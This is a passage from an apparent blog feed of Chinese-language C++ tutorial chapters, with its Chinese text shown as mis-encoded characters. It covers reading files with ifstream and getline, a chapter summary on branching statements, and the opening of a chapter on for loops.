class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt; // ç”¨äºå­˜å‚¨è¯»å–çš„è¡Œ</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 1. åˆ›å»º ifstream å¯¹è±¡å¹¶å…³è”æ–‡ä»¶</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::ifstream <span class="title">inFile</span><span class="params">(<span class="string">&quot;report.txt&quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. æ£€æŸ¥æ–‡ä»¶æ˜¯å¦æˆåŠŸæ‰“å¼€</span></span><br><span class="line">    <span class="keyword">if</span> (!inFile.is_open()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Could not open report.txt for reading.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Reading data from report.txt using getline:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> line;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt; lines;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. ä½¿ç”¨ getline é€è¡Œè¯»å–</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">std</span>::getline(inFile, line)) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Read line: &quot;</span> &lt;&lt; line &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        lines.push_back(line); <span class="comment">// å°†è¯»å–çš„è¡Œå­˜å…¥ vector</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ£€æŸ¥å¾ªç¯æ˜¯å› ä¸ºåˆ°è¾¾æ–‡ä»¶æœ«å°¾è¿˜æ˜¯å‘ç”Ÿé”™è¯¯</span></span><br><span class="line">    <span class="keyword">if</span> (inFile.eof()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nReached end of file.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (inFile.fail()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;\nError reading file (not EOF).&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. å…³é—­æ–‡ä»¶</span></span><br><span class="line">    inFile.close();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\n--- Stored Lines ---&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; stored_line : lines) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; stored_line &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç¤ºä¾‹ï¼šä½¿ç”¨ &gt;&gt; è¯»å–ç‰¹å®šç±»å‹çš„æ•°æ® (å‡è®¾æ–‡ä»¶æ ¼å¼å·²çŸ¥)</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::ifstream <span class="title">dataFile</span><span class="params">(<span class="string">&quot;report.txt&quot;</span>)</span></span>; <span class="comment">// é‡æ–°æ‰“å¼€æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">if</span> (!dataFile.is_open()) &#123;</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Could not reopen report.txt&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">         <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nReading specific data using &gt;&gt; (may be fragile):&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> header, productLabel, productName, qtyLabel;</span><br><span class="line">    <span class="keyword">int</span> quantity;</span><br><span class="line">    <span class="keyword">double</span> revenue;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·³è¿‡ç¬¬ä¸€è¡Œ</span></span><br><span class="line">    <span class="built_in">std</span>::getline(dataFile, header);</span><br><span class="line">    <span class="comment">// è¯»å–ç¬¬äºŒè¡Œçš„æ•°æ®</span></span><br><span class="line">    dataFile &gt;&gt; productLabel &gt;&gt; productName;</span><br><span class="line">    <span class="comment">// è¯»å–ç¬¬ä¸‰è¡Œçš„æ•°æ®</span></span><br><span class="line">    dataFile &gt;&gt; qtyLabel &gt;&gt; quantity;</span><br><span class="line">    <span class="comment">// è·³è¿‡ç¬¬å››è¡Œçš„ Revenue: æ ‡ç­¾</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> revenueLabel;</span><br><span class="line">    dataFile &gt;&gt; revenueLabel &gt;&gt; revenue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dataFile) &#123; <span class="comment">// æ£€æŸ¥è¯»å–æ˜¯å¦æˆåŠŸ</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Product: &quot;</span> &lt;&lt; productName &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Quantity: &quot;</span> &lt;&lt; quantity &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Revenue: &quot;</span> &lt;&lt; revenue &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Failed to parse data using &gt;&gt;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    dataFile.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ä»£ç è§£é‡Š:</strong></p><ol><li> ç¬¬ä¸€ä¸ªå¾ªç¯ä½¿ç”¨ <code>std::getline()</code> è¯»å–æ–‡ä»¶çš„æ¯ä¸€è¡Œï¼Œå¹¶å°†å…¶æ‰“å°å‡ºæ¥ï¼ŒåŒæ—¶å­˜å‚¨åœ¨ <code>lines</code> å‘é‡ä¸­ã€‚<code>while (std::getline(inFile, line))</code> æ˜¯è¯»å–æ–‡æœ¬æ–‡ä»¶çš„å¸¸ç”¨æ¨¡å¼ã€‚</li><li> å¾ªç¯ç»“æŸåï¼Œé€šè¿‡æ£€æŸ¥ <code>inFile.eof()</code> å’Œ <code>inFile.fail()</code> å¯ä»¥åˆ¤æ–­å¾ªç¯æ˜¯æ­£å¸¸ç»“æŸï¼ˆåˆ°è¾¾æ–‡ä»¶æœ«å°¾ï¼‰è¿˜æ˜¯å› ä¸ºå…¶ä»–é”™è¯¯ã€‚</li><li> ç¬¬äºŒä¸ªç¤ºä¾‹æ¼”ç¤ºäº†ä½¿ç”¨ <code>&gt;&gt;</code> æ“ä½œç¬¦è¯»å–ç‰¹å®šæ ¼å¼çš„æ•°æ®ã€‚è¿™ç§æ–¹æ³•å¯¹äºæ ¼å¼ä¸¥æ ¼å›ºå®šçš„æ–‡ä»¶å¯èƒ½æœ‰æ•ˆï¼Œä½†å¦‚æœæ–‡ä»¶æ ¼å¼ç¨æœ‰å˜åŒ–ï¼ˆä¾‹å¦‚å¤šäº†ç©ºæ ¼ï¼‰ï¼Œ<code>&gt;&gt;</code> å°±å¯èƒ½è¯»å–å¤±è´¥æˆ–è¯»åˆ°é”™è¯¯çš„æ•°æ®ï¼Œå› æ­¤é€šå¸¸ä¸å¦‚ <code>getline</code> å¥å£®ã€‚éœ€è¦ä»”ç»†å¤„ç†æ ‡ç­¾å’Œæ•°æ®ç±»å‹ã€‚</li></ol><p>æ–‡ä»¶ I/O æ˜¯ C++ ç¼–ç¨‹ä¸­éå¸¸é‡è¦çš„éƒ¨åˆ†ï¼Œå®ƒä½¿å¾—ç¨‹åºèƒ½å¤ŸæŒä¹…åŒ–æ•°æ®ï¼Œå¹¶ä¸å…¶ä»–ç¨‹åºæˆ–ç³»ç»Ÿè¿›è¡Œäº¤äº’ã€‚</p><h2 id="6-9-æ€»ç»“"><a href="#6-9-æ€»ç»“" class="headerlink" title="6.9 æ€»ç»“"></a>6.9 æ€»ç»“</h2><p>æœ¬ç« ä»‹ç»äº† C++ ä¸­ç”¨äºæ§åˆ¶ç¨‹åºæµç¨‹çš„å„ç§åˆ†æ”¯è¯­å¥å’Œç›¸å…³æ¦‚å¿µï¼Œä½¿å¾—ç¨‹åºèƒ½å¤Ÿæ ¹æ®ä¸åŒçš„æ¡ä»¶æ‰§è¡Œä¸åŒçš„ä»£ç è·¯å¾„ã€‚</p><p>ä¸»è¦å†…å®¹å›é¡¾ï¼š</p><ol><li><p><strong><code>if</code> è¯­å¥ç³»åˆ—:</strong></p><ul><li>  <code>if</code> è¯­å¥ï¼šæ ¹æ®æ¡ä»¶æ˜¯å¦ä¸ºçœŸæ¥å†³å®šæ˜¯å¦æ‰§è¡ŒæŸæ®µä»£ç ã€‚</li><li>  <code>if else</code> è¯­å¥ï¼šæä¾›ä¸¤ä¸ªä»£ç è·¯å¾„ï¼Œæ ¹æ®æ¡ä»¶ä¸ºçœŸæˆ–å‡é€‰æ‹©å…¶ä¸€æ‰§è¡Œã€‚</li><li>  <code>if else if else</code> ç»“æ„ï¼šç”¨äºå¤„ç†å¤šä¸ªäº’æ–¥çš„æ¡ä»¶ï¼Œæä¾›å¤šè·¯åˆ†æ”¯é€‰æ‹©ã€‚</li></ul></li><li><p><strong>é€»è¾‘è¿ç®—ç¬¦:</strong></p><ul><li>  <code>||</code> (é€»è¾‘æˆ–)ï¼šä¸¤ä¸ªæ“ä½œæ•°ä¸­è‡³å°‘ä¸€ä¸ªä¸ºçœŸæ—¶ï¼Œç»“æœä¸ºçœŸã€‚</li><li>  <code>&amp;&amp;</code> (é€»è¾‘ä¸)ï¼šä¸¤ä¸ªæ“ä½œæ•°éƒ½ä¸ºçœŸæ—¶ï¼Œç»“æœæ‰ä¸ºçœŸã€‚å…·æœ‰çŸ­è·¯æ±‚å€¼ç‰¹æ€§ã€‚</li><li>  <code>!</code> (é€»è¾‘é)ï¼šåè½¬æ“ä½œæ•°çš„é€»è¾‘çŠ¶æ€ï¼ˆçœŸå˜å‡ï¼Œå‡å˜çœŸï¼‰ã€‚</li></ul></li><li><p><strong><code>cctype</code> åº“:</strong></p><ul><li>  æä¾›äº†ä¸€ç³»åˆ—ç”¨äºå¤„ç†å­—ç¬¦çš„å‡½æ•°ï¼Œå¦‚ <code>isalpha()</code>, <code>isdigit()</code>, <code>isspace()</code>, <code>ispunct()</code>, <code>toupper()</code>, <code>tolower()</code> ç­‰ï¼Œæ–¹ä¾¿è¿›è¡Œå­—ç¬¦åˆ†ç±»å’Œè½¬æ¢ã€‚</li></ul></li><li><p><strong>ä¸‰å…ƒè¿ç®—ç¬¦ (<code>?:</code>)</strong>:</p><ul><li>  æä¾›äº†ä¸€ç§ç®€æ´çš„æ–¹å¼æ¥æ ¹æ®æ¡ä»¶é€‰æ‹©ä¸¤ä¸ªå€¼ä¸­çš„ä¸€ä¸ªï¼Œæ˜¯ <code>if else</code> è¯­å¥çš„ä¸€ç§ç´§å‡‘æ›¿ä»£å½¢å¼ï¼Œå¸¸ç”¨äºç®€å•çš„èµ‹å€¼æ“ä½œã€‚</li><li>  è¯­æ³•ï¼š<code>condition ? expression1 : expression2;</code></li></ul></li><li><p><strong><code>switch</code> è¯­å¥:</strong></p><ul><li>  æ ¹æ®ä¸€ä¸ªæ•´æ•°è¡¨è¾¾å¼çš„å€¼ï¼Œä»å¤šä¸ª <code>case</code> æ ‡ç­¾ä¸­é€‰æ‹©ä¸€ä¸ªåŒ¹é…çš„æ‰§è¡Œç‚¹ã€‚</li><li>  é€šå¸¸ä¸ <code>break</code> è¯­å¥é…åˆä½¿ç”¨ï¼Œä»¥é˜²æ­¢â€œè´¯ç©¿â€åˆ°ä¸‹ä¸€ä¸ª <code>case</code>ã€‚</li><li>  <code>default</code> æ ‡ç­¾å¤„ç†æ‰€æœ‰å…¶ä»–ä¸åŒ¹é…çš„æƒ…å†µã€‚</li><li>  <code>case</code> æ ‡ç­¾å¿…é¡»æ˜¯å¸¸é‡è¡¨è¾¾å¼ã€‚</li><li>  é€‚ç”¨äºåŸºäºå•ä¸ªç¦»æ•£æ•´æ•°å€¼çš„å¤šè·¯åˆ†æ”¯ã€‚</li></ul></li><li><p><strong><code>break</code> å’Œ <code>continue</code> è¯­å¥:</strong></p><ul><li>  <code>break</code>ï¼šç«‹å³ç»ˆæ­¢<strong>æœ€å†…å±‚</strong>çš„å¾ªç¯ï¼ˆ<code>for</code>, <code>while</code>, <code>do while</code>ï¼‰æˆ– <code>switch</code> è¯­å¥ã€‚</li><li>  <code>continue</code>ï¼šè·³è¿‡å½“å‰å¾ªç¯è¿­ä»£çš„<strong>å‰©ä½™éƒ¨åˆ†</strong>ï¼Œç›´æ¥å¼€å§‹ä¸‹ä¸€æ¬¡è¿­ä»£ï¼ˆæ›´æ–°å’Œæ¡ä»¶æ£€æŸ¥ï¼‰ã€‚</li></ul></li><li><p><strong>è¯»å–æ•°å­—çš„å¾ªç¯:</strong></p><ul><li>  æ¼”ç¤ºäº†å¦‚ä½•ä½¿ç”¨å¾ªç¯ï¼ˆå¦‚ <code>while (cin &gt;&gt; value)</code>ï¼‰æ¥è¿ç»­è¯»å–æ•°å­—è¾“å…¥ã€‚</li><li>  å¼ºè°ƒäº†å¤„ç†é”™è¯¯è¾“å…¥çš„é‡è¦æ€§ï¼ŒåŒ…æ‹¬ä½¿ç”¨ <code>cin.clear()</code> æ¸…é™¤é”™è¯¯çŠ¶æ€å’Œ <code>cin.ignore()</code> ä¸¢å¼ƒæ— æ•ˆè¾“å…¥ï¼Œä»¥ç¼–å†™æ›´å¥å£®çš„è¾“å…¥ä»£ç ã€‚</li></ul></li><li><p><strong>ç®€å•æ–‡ä»¶è¾“å…¥/è¾“å‡º:</strong></p><ul><li>  å¼•å…¥äº† <code>&lt;fstream&gt;</code> åº“ï¼Œç”¨äºæ–‡ä»¶æ“ä½œã€‚</li><li>  <code>ofstream</code>ï¼šç”¨äºå‘æ–‡ä»¶<strong>å†™å…¥</strong>æ•°æ®ï¼ˆè¾“å‡ºæ–‡ä»¶æµï¼‰ï¼Œä½¿ç”¨ <code>&lt;&lt;</code> æ“ä½œç¬¦ã€‚</li><li>  <code>ifstream</code>ï¼šç”¨äºä»æ–‡ä»¶<strong>è¯»å–</strong>æ•°æ®ï¼ˆè¾“å…¥æ–‡ä»¶æµï¼‰ï¼Œä½¿ç”¨ <code>&gt;&gt;</code> æˆ– <code>getline()</code>ã€‚</li><li>  å¼ºè°ƒäº†æ–‡ä»¶æ‰“å¼€æ£€æŸ¥ (<code>is_open()</code>) å’Œå…³é—­æ–‡ä»¶ (<code>close()</code> æˆ–åˆ©ç”¨å¯¹è±¡ææ„) çš„é‡è¦æ€§ã€‚</li><li>  åŒºåˆ†äº†æ–‡æœ¬ I/O å’ŒäºŒè¿›åˆ¶ I/O çš„åŸºæœ¬æ¦‚å¿µã€‚</li></ul></li></ol><p>é€šè¿‡æŒæ¡è¿™äº›åˆ†æ”¯ç»“æ„å’Œæ§åˆ¶è¯­å¥ï¼Œå¯ä»¥ç¼–å†™å‡ºèƒ½å¤Ÿå“åº”ä¸åŒæƒ…å†µã€å¤„ç†ç”¨æˆ·è¾“å…¥å’Œæ–‡ä»¶æ•°æ®çš„æ›´å¤æ‚ã€æ›´çµæ´»çš„ C++ ç¨‹åºã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chapter 5 å¾ªç¯å’Œå…³ç³»è¡¨è¾¾å¼</title>
      <link href="2025/04/26/Cpp_tutorial_Chapter_5/"/>
      <url>2025/04/26/Cpp_tutorial_Chapter_5/</url>
      
        <content type="html"><![CDATA[<h2 id="5-1-forå¾ªç¯"><a href="#5-1-forå¾ªç¯" class="headerlink" title="5.1 forå¾ªç¯"></a>5.1 forå¾ªç¯</h2><p>å¾ªç¯æ˜¯ç¼–ç¨‹ä¸­çš„åŸºæœ¬æ§åˆ¶ç»“æ„ï¼Œå®ƒå…è®¸æˆ‘ä»¬é‡å¤æ‰§è¡Œä¸€æ®µä»£ç ï¼Œç›´åˆ°æ»¡è¶³æŸä¸ªæ¡ä»¶ä¸ºæ­¢ã€‚<code>for</code> å¾ªç¯æ˜¯ C++ ä¸­æœ€å¸¸ç”¨çš„å¾ªç¯ç»“æ„ä¹‹ä¸€ï¼Œç‰¹åˆ«é€‚ç”¨äºå·²çŸ¥å¾ªç¯æ¬¡æ•°æˆ–éœ€è¦æŒ‰ç‰¹å®šæ­¥é•¿è¿­ä»£çš„æƒ…å†µã€‚</p><h3 id="5-1-1-forå¾ªç¯çš„ç»„æˆéƒ¨åˆ†"><a href="#5-1-1-forå¾ªç¯çš„ç»„æˆéƒ¨åˆ†" class="headerlink" title="5.1.1 forå¾ªç¯çš„ç»„æˆéƒ¨åˆ†"></a>5.1.1 forå¾ªç¯çš„ç»„æˆéƒ¨åˆ†</h3><p><code>for</code> å¾ªç¯çš„å¤´éƒ¨åŒ…å«ä¸‰ä¸ªç”±åˆ†å· <code>;</code> åˆ†éš”çš„éƒ¨åˆ†ï¼Œæ§åˆ¶ç€å¾ªç¯çš„æ‰§è¡Œæµç¨‹ï¼š</p><ol><li><strong>åˆå§‹åŒ– (Initialization):</strong><ul><li>  åœ¨å¾ªç¯å¼€å§‹å‰æ‰§è¡Œ<strong>ä¸€æ¬¡</strong>ã€‚</li><li>  é€šå¸¸ç”¨äºå£°æ˜å’Œ/æˆ–åˆå§‹åŒ–å¾ªç¯æ§åˆ¶å˜é‡ï¼ˆè®¡æ•°å™¨ï¼‰ã€‚</li><li>  å¯ä»¥åŒ…å«å¤šæ¡è¯­å¥ï¼Œç”¨é€—å·åˆ†éš”ï¼ˆè§ 5.1.11ï¼‰ã€‚</li><li>  ä¹Ÿå¯ä»¥ä¸ºç©ºã€‚</li></ul></li><li><strong>æµ‹è¯•æ¡ä»¶ (Test Condition / Condition):</strong><ul><li>  åœ¨<strong>æ¯æ¬¡</strong>å¾ªç¯è¿­ä»£å¼€å§‹å‰è¿›è¡Œæ±‚å€¼ã€‚</li><li>  ç»“æœå¿…é¡»æ˜¯ä¸€ä¸ªå¸ƒå°”å€¼ (<code>true</code> æˆ– <code>false</code>) æˆ–å¯ä»¥è½¬æ¢ä¸ºå¸ƒå°”å€¼ï¼ˆéé›¶ä¸º <code>true</code>ï¼Œé›¶ä¸º <code>false</code>ï¼‰ã€‚</li><li>  å¦‚æœæ¡ä»¶ä¸º <code>true</code>ï¼Œåˆ™æ‰§è¡Œå¾ªç¯ä½“ã€‚</li><li>  å¦‚æœæ¡ä»¶ä¸º <code>false</code>ï¼Œåˆ™å¾ªç¯ç»ˆæ­¢ï¼Œç¨‹åºç»§ç»­æ‰§è¡Œå¾ªç¯åé¢çš„è¯­å¥ã€‚</li><li>  ä¹Ÿå¯ä»¥ä¸ºç©ºï¼Œç©ºæ¡ä»¶è¢«è§†ä¸º <code>true</code>ï¼Œå½¢æˆæ— é™å¾ªç¯ï¼ˆéœ€è¦å…¶ä»–æ–¹å¼è·³å‡ºï¼Œå¦‚ <code>break</code>ï¼‰ã€‚</li></ul></li><li><strong>æ›´æ–° (Update / Increment / Decrement):</strong><ul><li>  åœ¨<strong>æ¯æ¬¡</strong>å¾ªç¯è¿­ä»£<strong>ç»“æŸæ—¶</strong>ï¼ˆæ‰§è¡Œå®Œå¾ªç¯ä½“ä¹‹åï¼Œä¸‹æ¬¡æµ‹è¯•æ¡ä»¶ä¹‹å‰ï¼‰æ‰§è¡Œã€‚</li><li>  é€šå¸¸ç”¨äºä¿®æ”¹å¾ªç¯æ§åˆ¶å˜é‡ï¼ˆä¾‹å¦‚ï¼Œé€’å¢æˆ–é€’å‡è®¡æ•°å™¨ï¼‰ã€‚</li><li>  å¯ä»¥åŒ…å«å¤šæ¡è¯­å¥ï¼Œç”¨é€—å·åˆ†éš”ã€‚</li><li>  ä¹Ÿå¯ä»¥ä¸ºç©ºã€‚</li></ul></li></ol><p><strong>è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (initialization; test_condition; update) &#123;</span><br><span class="line">    <span class="comment">// å¾ªç¯ä½“ (statement(s) to be executed repeatedly)</span></span><br><span class="line">    statement1;</span><br><span class="line">    statement2;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// æˆ–è€…å¦‚æœå¾ªç¯ä½“åªæœ‰ä¸€æ¡è¯­å¥ï¼Œå¯ä»¥çœç•¥èŠ±æ‹¬å·</span></span><br><span class="line"><span class="keyword">for</span> (initialization; test_condition; update)</span><br><span class="line">    single_statement; </span><br></pre></td></tr></table></figure><p><strong>æ‰§è¡Œæµç¨‹:</strong></p><ol><li> æ‰§è¡Œ <code>initialization</code>ã€‚</li><li> è®¡ç®— <code>test_condition</code>ã€‚</li><li> å¦‚æœ <code>test_condition</code> ä¸º <code>false</code>ï¼Œè·³å‡ºå¾ªç¯ï¼Œæ‰§è¡Œå¾ªç¯åé¢çš„ä»£ç ã€‚</li><li> å¦‚æœ <code>test_condition</code> ä¸º <code>true</code>ï¼Œæ‰§è¡Œå¾ªç¯ä½“ä¸­çš„è¯­å¥ã€‚</li><li> æ‰§è¡Œ <code>update</code>ã€‚</li><li> å›åˆ°æ­¥éª¤ 2ã€‚</li></ol><p><strong>ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// æ‰“å°æ•°å­— 0 åˆ° 4</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; <span class="comment">// 1. åˆå§‹åŒ–: å£°æ˜å¹¶åˆå§‹åŒ–è®¡æ•°å™¨ i ä¸º 0</span></span><br><span class="line">         i &lt; <span class="number">5</span>;   <span class="comment">// 2. æµ‹è¯•æ¡ä»¶: åªè¦ i å°äº 5 å°±ç»§ç»­</span></span><br><span class="line">         i = i + <span class="number">1</span>) <span class="comment">// 4. æ›´æ–°: æ¯æ¬¡å¾ªç¯åå°† i å¢åŠ  1</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 3. å¾ªç¯ä½“</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;i = &quot;</span> &lt;&lt; i &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Loop finished.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-1-2-å›åˆ°forå¾ªç¯"><a href="#5-1-2-å›åˆ°forå¾ªç¯" class="headerlink" title="5.1.2 å›åˆ°forå¾ªç¯"></a>5.1.2 å›åˆ°forå¾ªç¯</h3><p><code>for</code> å¾ªç¯æä¾›äº†ä¸€ç§éå¸¸ç»“æ„åŒ–çš„æ–¹å¼æ¥ç¼–å†™è®¡æ•°å¾ªç¯ã€‚ä¸Šé¢çš„ä¾‹å­å±•ç¤ºäº†ä¸€ä¸ªå…¸å‹çš„ä» 0 å¼€å§‹è®¡æ•°åˆ°æŸä¸ªå€¼ä¹‹å‰çš„å¾ªç¯ã€‚</p><p><strong>åŸºæœ¬è®¡æ•°å¾ªç¯ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// è®¡ç®— 1 åˆ° 10 çš„å’Œ</span></span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">10</span>; i = i + <span class="number">1</span>) &#123; <span class="comment">// ä» 1 å¼€å§‹ï¼ŒåŒ…å« 10</span></span><br><span class="line">        sum = sum + i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sum of 1 to 10 is: &quot;</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 55</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å€’åºæ‰“å° 5 